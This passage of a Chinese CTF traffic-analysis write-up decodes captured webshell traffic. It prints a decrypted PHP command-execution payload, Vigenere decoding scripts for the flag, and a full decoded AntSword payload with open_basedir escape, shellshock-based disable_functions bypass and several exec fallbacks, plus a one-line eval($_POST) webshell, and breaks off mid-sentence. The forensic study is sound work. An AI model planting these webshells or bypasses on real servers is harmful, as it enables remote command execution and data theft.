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</span><br></pre></td></tr></table></figure>



<p>解密后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getSafeStr($str)&#123;</span><br><span class="line">    $s1 = iconv(&#x27;utf-8&#x27;,&#x27;gbk//IGNORE&#x27;,$str);</span><br><span class="line">    $s0 = iconv(&#x27;gbk&#x27;,&#x27;utf-8//IGNORE&#x27;,$s1);</span><br><span class="line">    if($s0 == $str)&#123;</span><br><span class="line">        return $s0;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return iconv(&#x27;gbk&#x27;,&#x27;utf-8//IGNORE&#x27;,$str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function main($cmd)</span><br><span class="line">&#123;</span><br><span class="line">    @set_time_limit(0);</span><br><span class="line">    @ignore_user_abort(1);</span><br><span class="line">    @ini_set(&#x27;max_execution_time&#x27;, 0);</span><br><span class="line">    $result = array();</span><br><span class="line">    $PadtJn = @ini_get(&#x27;disable_functions&#x27;);</span><br><span class="line">    if (! empty($PadtJn)) &#123;</span><br><span class="line">        $PadtJn = preg_replace(&#x27;/[, ]+/&#x27;, &#x27;,&#x27;, $PadtJn);</span><br><span class="line">        $PadtJn = explode(&#x27;,&#x27;, $PadtJn);</span><br><span class="line">        $PadtJn = array_map(&#x27;trim&#x27;, $PadtJn);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $PadtJn = array();</span><br><span class="line">    &#125;</span><br><span class="line">    $c = $cmd;</span><br><span class="line">    if (FALSE !== strpos(strtolower(PHP_OS), &#x27;win&#x27;)) &#123;</span><br><span class="line">        $c = $c . &quot; 2&gt;&amp;1\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $JueQDBH = &#x27;is_callable&#x27;;</span><br><span class="line">    $Bvce = &#x27;in_array&#x27;;</span><br><span class="line">    if ($JueQDBH(&#x27;system&#x27;) and ! $Bvce(&#x27;system&#x27;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;proc_open&#x27;) and ! $Bvce(&#x27;proc_open&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $handle = proc_open($c, array(</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;r&#x27;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;w&#x27;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;w&#x27;</span><br><span class="line">            )</span><br><span class="line">        ), $pipes);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        while (! feof($pipes[1])) &#123;</span><br><span class="line">            $kWJW .= fread($pipes[1], 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        @proc_close($handle);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;passthru&#x27;) and ! $Bvce(&#x27;passthru&#x27;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;shell_exec&#x27;) and ! $Bvce(&#x27;shell_exec&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = shell_exec($c);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;exec&#x27;) and ! $Bvce(&#x27;exec&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = array();</span><br><span class="line">        exec($c, $kWJW);</span><br><span class="line">        $kWJW = join(chr(10), $kWJW) . chr(10);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;exec&#x27;) and ! $Bvce(&#x27;popen&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $fp = popen($c, &#x27;r&#x27;);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        if (is_resource($fp)) &#123;</span><br><span class="line">            while (! feof($fp)) &#123;</span><br><span class="line">                $kWJW .= fread($fp, 1024);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose($fp);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $kWJW = 0;</span><br><span class="line">        $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;);</span><br><span class="line">        $result[&quot;msg&quot;] = base64_encode(&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;);</span><br><span class="line">        $key = $_SESSION[&#x27;k&#x27;];</span><br><span class="line">        echo encrypt(json_encode($result), $key);</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">    $result[&quot;msg&quot;] = base64_encode(getSafeStr($kWJW));</span><br><span class="line">    echo encrypt(json_encode($result),  $_SESSION[&#x27;k&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">        if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">        &#123;</span><br><span class="line">                for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">                         $data[$i] = $data[$i]^$key[$i+1&amp;15];</span><br><span class="line">                        &#125;</span><br><span class="line">                        return $data;</span><br><span class="line">        &#125;</span><br><span class="line">    else</span><br><span class="line">        &#123;</span><br><span class="line">                return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;$cmd=&quot;cat GronKey.txt&quot;;</span><br><span class="line">main($cmd);</span><br></pre></td></tr></table></figure>

<p>对应返回包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -k 2295d22e2d70888f -a w5lcFkJ5g/LtCqI0NgGN0nr2fGo9r1/AzKUMpzC878J4hU17Fu2Q89EMiYBl3hWbGAewU7bpnuWx4oBUmohKkg==</span><br></pre></td></tr></table></figure>

<p>解密结果</p>
<p>$cmd&#x3D;”cat GronKey.txt”;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot;1,50,61,8,9,20,63,41&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>tcp流三</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#125;$cmd=&quot;cat flag.txt&quot;;</span><br><span class="line">main($cmd);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>tcp流2</p>
<p>Vigenere解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = [1,50,61,8,9,20,63,41]</span><br><span class="line">import string</span><br><span class="line">dic = string.ascii_lowercase</span><br><span class="line">key = &#x27;&#x27;</span><br><span class="line">for k in s:</span><br><span class="line">    key += dic[k%26]</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>

<p>解的维吉尼亚的key </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def decrypt_string(ciphertext, offsets):</span><br><span class="line">    decrypted_string = &quot;&quot;</span><br><span class="line">    offset_index = 0</span><br><span class="line"></span><br><span class="line">    for char in ciphertext:</span><br><span class="line">        offset = offsets[offset_index] % 26</span><br><span class="line">        decrypted_char_code = (ord(char) - ord(&#x27;A&#x27;) - offset) % 26 + ord(&#x27;A&#x27;)</span><br><span class="line">        decrypted_char = chr(decrypted_char_code)</span><br><span class="line">        decrypted_string += decrypted_char</span><br><span class="line"></span><br><span class="line">        offset_index = (offset_index + 1) % len(offsets)</span><br><span class="line"></span><br><span class="line">    return decrypted_string</span><br><span class="line"></span><br><span class="line">ciphertext = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;</span><br><span class="line">offsets = [1, 50, 61, 8, 9, 20, 63]</span><br><span class="line">decrypted_string = decrypt_string(ciphertext, offsets)</span><br><span class="line">print(decrypted_string)</span><br></pre></td></tr></table></figure>



<h1 id="蚁剑流量"><a href="#蚁剑流量" class="headerlink" title="蚁剑流量"></a>蚁剑流量</h1><p>流量特征</p>
<p><a href="https://blog.csdn.net/UserNick157/article/details/124405353">中国蚁剑流量分析-CSDN博客</a></p>
<p>一道蚁剑流量分析题目，找到secret文件中的内容即为flag</p>
<p>打开流量包，追踪http流发现是蚁剑类型的流量分析，先看一下追踪流的结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g883299482ed9b=KGL2Jpbi9zaA%3D%3D&amp;h37e8ca57159a8=WqY2QgIi92YXIvd3d3L2h0bWwiO2NhdCAvc2VjcmV0O2VjaG8gZDBmNGE2OGE7cHdkO2VjaG8gMjVlNzA%3D&amp;n3wst4r=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%24opdir%3D%40ini_get(%22open_basedir%22)%3Bif(%24opdir)%20%7B%24ocwd%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24oparr%3Dpreg_split(%22%2F%3B%7C%3A%2F%22%2C%24opdir)%3B%40array_push(%24oparr%2C%24ocwd%2Csys_get_temp_dir())%3Bforeach(%24oparr%20as%20%24item)%20%7Bif(!%40is_writable(%24item))%7Bcontinue%3B%7D%3B%24tmdir%3D%24item.%22%2F.46088%22%3B%40mkdir(%24tmdir)%3Bif(!%40file_exists(%24tmdir))%7Bcontinue%3B%7D%40chdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%20%22..%22)%3B%24cntarr%3D%40preg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24tmdir)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24cntarr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3B%7D%3B%40ini_set(%22open_basedir%22%2C%22%2F%22)%3B%40rmdir(%24tmdir)%3Bbreak%3B%7D%3B%7D%3B%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%2269ff5%22.%228ed3f0%22%3Becho%20%40asenc(%24output)%3Becho%20%2294%22.%22d8f%22%3B%7Dob_start()%3Btry%7B%24p%3Dbase64_decode(substr(%24_POST%5B%22g883299482ed9b%22%5D%2C2))%3B%24s%3Dbase64_decode(substr(%24_POST%5B%22h37e8ca57159a8%22%5D%2C2))%3B%24envstr%3D%40base64_decode(substr(%24_POST%5B%22yba4b314a083ba%22%5D%2C2))%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24c%3Dsubstr(%24d%2C0%2C1)%3D%3D%22%2F%22%3F%22-c%20%5C%22%7B%24s%7D%5C%22%22%3A%22%2Fc%20%5C%22%7B%24s%7D%5C%22%22%3Bif(substr(%24d%2C0%2C1)%3D%3D%22%2F%22)%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22)%3B%7Delse%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOW64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShell%2Fv1.0%2F%3B%22)%3B%7Dif(!empty(%24envstr))%7B%24envarr%3Dexplode(%22%7C%7C%7Casline%7C%7C%7C%22%2C%20%24envstr)%3Bforeach(%24envarr%20as%20%24v)%20%7Bif%20(!empty(%24v))%20%7B%40putenv(str_replace(%22%7C%7C%7Caskey%7C%7C%7C%22%2C%20%22%3D%22%2C%20%24v))%3B%7D%7D%7D%24r%3D%22%7B%24p%7D%20%7B%24c%7D%22%3Bfunction%20fe(%24f)%7B%24d%3Dexplode(%22%2C%22%2C%40ini_get(%22disable_functions%22))%3Bif(empty(%24d))%7B%24d%3Darray()%3B%7Delse%7B%24d%3Darray_map(&#x27;trim&#x27;%2Carray_map(&#x27;strtolower&#x27;%2C%24d))%3B%7Dreturn(function_exists(%24f)%26%26is_callable(%24f)%26%26!in_array(%24f%2C%24d))%3B%7D%3Bfunction%20runshellshock(%24d%2C%20%24c)%20%7Bif%20(substr(%24d%2C%200%2C%201)%20%3D%3D%20%22%2F%22%20%26%26%20fe(&#x27;putenv&#x27;)%20%26%26%20(fe(&#x27;error_log&#x27;)%20%7C%7C%20fe(&#x27;mail&#x27;)))%20%7Bif%20(strstr(readlink(%22%2Fbin%2Fsh%22)%2C%20%22bash%22)%20!%3D%20FALSE)%20%7B%24tmp%20%3D%20tempnam(sys_get_temp_dir()%2C%20&#x27;as&#x27;)%3Bputenv(%22PHP_LOL%3D()%20%7B%20x%3B%20%7D%3B%20%24c%20%3E%24tmp%202%3E%261%22)%3Bif%20(fe(&#x27;error_log&#x27;))%20%7Berror_log(%22a%22%2C%201)%3B%7D%20else%20%7Bmail(%22a%40127.0.0.1%22%2C%20%22%22%2C%20%22%22%2C%20%22-bv%22)%3B%7D%7D%20else%20%7Breturn%20False%3B%7D%24output%20%3D%20%40file_get_contents(%24tmp)%3B%40unlink(%24tmp)%3Bif%20(%24output%20!%3D%20%22%22)%20%7Bprint(%24output)%3Breturn%20True%3B%7D%7Dreturn%20False%3B%7D%3Bfunction%20runcmd(%24c)%7B%24ret%3D0%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(fe(&#x27;system&#x27;))%7B%40system(%24c%2C%24ret)%3B%7Delseif(fe(&#x27;passthru&#x27;))%7B%40passthru(%24c%2C%24ret)%3B%7Delseif(fe(&#x27;shell_exec&#x27;))%7Bprint(%40shell_exec(%24c))%3B%7Delseif(fe(&#x27;exec&#x27;))%7B%40exec(%24c%2C%24o%2C%24ret)%3Bprint(join(%22%0A%22%2C%24o))%3B%7Delseif(fe(&#x27;popen&#x27;))%7B%24fp%3D%40popen(%24c%2C&#x27;r&#x27;)%3Bwhile(!%40feof(%24fp))%7Bprint(%40fgets(%24fp%2C2048))%3B%7D%40pclose(%24fp)%3B%7Delseif(fe(&#x27;proc_open&#x27;))%7B%24p%20%3D%20%40proc_open(%24c%2C%20array(1%20%3D%3E%20array(&#x27;pipe&#x27;%2C%20&#x27;w&#x27;)%2C%202%20%3D%3E%20array(&#x27;pipe&#x27;%2C%20&#x27;w&#x27;))%2C%20%24io)%3Bwhile(!%40feof(%24io%5B1%5D))%7Bprint(%40fgets(%24io%5B1%5D%2C2048))%3B%7Dwhile(!%40feof(%24io%5B2%5D))%7Bprint(%40fgets(%24io%5B2%5D%2C2048))%3B%7D%40fclose(%24io%5B1%5D)%3B%40fclose(%24io%5B2%5D)%3B%40proc_close(%24p)%3B%7Delseif(fe(&#x27;antsystem&#x27;))%7B%40antsystem(%24c)%3B%7Delseif(runshellshock(%24d%2C%20%24c))%20%7Breturn%20%24ret%3B%7Delseif(substr(%24d%2C0%2C1)!%3D%22%2F%22%20%26%26%20%40class_exists(%22COM%22))%7B%24w%3Dnew%20COM(&#x27;WScript.shell&#x27;)%3B%24e%3D%24w-%3Eexec(%24c)%3B%24so%3D%24e-%3EStdOut()%3B%24ret.%3D%24so-%3EReadAll()%3B%24se%3D%24e-%3EStdErr()%3B%24ret.%3D%24se-%3EReadAll()%3Bprint(%24ret)%3B%7Delse%7B%24ret%20%3D%20127%3B%7Dreturn%20%24ret%3B%7D%3B%24ret%3D%40runcmd(%24r.%22%202%3E%261%22)%3Bprint%20(%24ret!%3D0)%3F%22ret%3D%7B%24ret%7D%22%3A%22%22%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&amp;yba4b314a083ba=Jx</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>是一些url加密后的数据，解密之后如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">g883299482ed9b=KGL2Jpbi9zaA==&amp;h37e8ca57159a8=WqY2QgIi92YXIvd3d3L2h0bWwiO2NhdCAvc2VjcmV0O2VjaG8gZDBmNGE2OGE7cHdkO2VjaG8gMjVlNzA=&amp;n3wst4r=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir=@ini_get(&quot;open_basedir&quot;);if($opdir) &#123;$ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$oparr=preg_split(&quot;/;|:/&quot;,$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) &#123;if(!@is_writable($item))&#123;continue;&#125;;$tmdir=$item.&quot;/.46088&quot;;@mkdir($tmdir);if(!@file_exists($tmdir))&#123;continue;&#125;@chdir($tmdir);@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);$cntarr=@preg_split(&quot;/\\\\|\//&quot;,$tmdir);for($i=0;$i&lt;sizeof($cntarr);$i++)&#123;@chdir(&quot;..&quot;);&#125;;@ini_set(&quot;open_basedir&quot;,&quot;/&quot;);@rmdir($tmdir);break;&#125;;&#125;;;function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;69ff5&quot;.&quot;8ed3f0&quot;;echo @asenc($output);echo &quot;94&quot;.&quot;d8f&quot;;&#125;ob_start();try&#123;$p=base64_decode(substr($_POST[&quot;g883299482ed9b&quot;],2));$s=base64_decode(substr($_POST[&quot;h37e8ca57159a8&quot;],2));$envstr=@base64_decode(substr($_POST[&quot;yba4b314a083ba&quot;],2));$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;/c \&quot;&#123;$s&#125;\&quot;&quot;;if(substr($d,0,1)==&quot;/&quot;)&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);&#125;else&#123;@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);&#125;if(!empty($envstr))&#123;$envarr=explode(&quot;|||asline|||&quot;, $envstr);foreach($envarr as $v) &#123;if (!empty($v)) &#123;@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));&#125;&#125;&#125;$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;function fe($f)&#123;$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));if(empty($d))&#123;$d=array();&#125;else&#123;$d=array_map(&#x27;trim&#x27;,array_map(&#x27;strtolower&#x27;,$d));&#125;return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));&#125;;function runshellshock($d, $c) &#123;if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe(&#x27;putenv&#x27;) &amp;&amp; (fe(&#x27;error_log&#x27;) || fe(&#x27;mail&#x27;))) &#123;if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;$tmp = tempnam(sys_get_temp_dir(), &#x27;as&#x27;);putenv(&quot;PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);if (fe(&#x27;error_log&#x27;)) &#123;error_log(&quot;a&quot;, 1);&#125; else &#123;mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);&#125;&#125; else &#123;return False;&#125;$output = @file_get_contents($tmp);@unlink($tmp);if ($output != &quot;&quot;) &#123;print($output);return True;&#125;&#125;return False;&#125;;function runcmd($c)&#123;$ret=0;$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if(fe(&#x27;system&#x27;))&#123;@system($c,$ret);&#125;elseif(fe(&#x27;passthru&#x27;))&#123;@passthru($c,$ret);&#125;elseif(fe(&#x27;shell_exec&#x27;))&#123;print(@shell_exec($c));&#125;elseif(fe(&#x27;exec&#x27;))&#123;@exec($c,$o,$ret);print(join(&quot;</span><br><span class="line">&quot;,$o));&#125;elseif(fe(&#x27;popen&#x27;))&#123;$fp=@popen($c,&#x27;r&#x27;);while(!@feof($fp))&#123;print(@fgets($fp,2048));&#125;@pclose($fp);&#125;elseif(fe(&#x27;proc_open&#x27;))&#123;$p = @proc_open($c, array(1 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;), 2 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;)), $io);while(!@feof($io[1]))&#123;print(@fgets($io[1],2048));&#125;while(!@feof($io[2]))&#123;print(@fgets($io[2],2048));&#125;@fclose($io[1]);@fclose($io[2]);@proc_close($p);&#125;elseif(fe(&#x27;antsystem&#x27;))&#123;@antsystem($c);&#125;elseif(runshellshock($d, $c)) &#123;return $ret;&#125;elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;))&#123;$w=new COM(&#x27;WScript.shell&#x27;);$e=$w-&gt;exec($c);$so=$e-&gt;StdOut();$ret.=$so-&gt;ReadAll();$se=$e-&gt;StdErr();$ret.=$se-&gt;ReadAll();print($ret);&#125;else&#123;$ret = 127;&#125;return $ret;&#125;;$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);print ($ret!=0)?&quot;ret=&#123;$ret&#125;&quot;:&quot;&quot;;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();&amp;yba4b314a083ba=Jx</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>下面的数据都不重要，主要看第一二行</p>
<p>g883299482ed9b&#x3D;KGL2Jpbi9zaA&#x3D;&#x3D;&amp;h37e8ca57159a8&#x3D;Wq<strong>Y2QgIi92YXIvd3d3L2h0bWwiO2NhdCAvc2VjcmV0O2VjaG8gZDBmNGE2OGE7cHdkO2VjaG8gMjVlNzA&#x3D;</strong>&amp;n3wst4r&#x3D;@ini_set(“display_errors”,</p>
<p>加粗的部分为base64加密的数据，并且一般是该参数两位之后的才是正确的命令的Base64编码</p>
<p>解码后为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd &quot;/var/www/html&quot;;cat /secret;echo d0f4a68a;pwd;echo 25e70</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>cat了secret文件中的内容，再接着往下找流量，即可找到secret文件中的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;code&gt;&lt;span style=&quot;color: #000000&quot;&gt;</span><br><span class="line">&lt;span style=&quot;color: #0000BB&quot;&gt;&amp;lt;?php&lt;br /&gt;highlight_file&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;__FILE__&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;);&lt;br /&gt;eval(&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;$_POST&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color: #DD0000&quot;&gt;&#x27;n3wst4r&#x27;&lt;/span&gt;&lt;span style=&quot;color: #007700&quot;&gt;]);&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;color: #0000BB&quot;&gt;?&amp;gt;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;69ff58ed3f0Y0UAr3G00D</span><br><span class="line">d0f4a68a</span><br><span class="line">/var/www/html</span><br><span class="line">25e70</span><br><span class="line">94d8f</span><br></pre></td></tr></table></figure>



<p>注意之前url解密后的内容中有</p>
